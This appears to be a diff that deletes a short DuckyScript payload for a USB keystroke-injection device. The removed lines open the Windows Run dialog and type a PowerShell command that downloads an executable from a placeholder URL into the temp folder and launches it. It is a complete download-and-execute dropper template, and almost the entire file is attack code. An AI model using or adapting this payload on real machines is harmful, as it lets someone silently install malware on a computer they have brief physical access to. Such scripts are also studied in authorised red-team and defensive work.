@@ -1,9 +1,0 @@
-DELAY 4000
-GUI r
-DELAY 150
-STRING powershell (new-object System.Net.WebClient).DownloadFile('
-REM ==== >URL BELOW< ====
-STRING REPLACE_WITH_URL
-REM ==== >URL ABOVE< ====
-STRING ','%TEMP%\f.exe'); Start-Process "%TEMP%\f.exe"
-ENTER
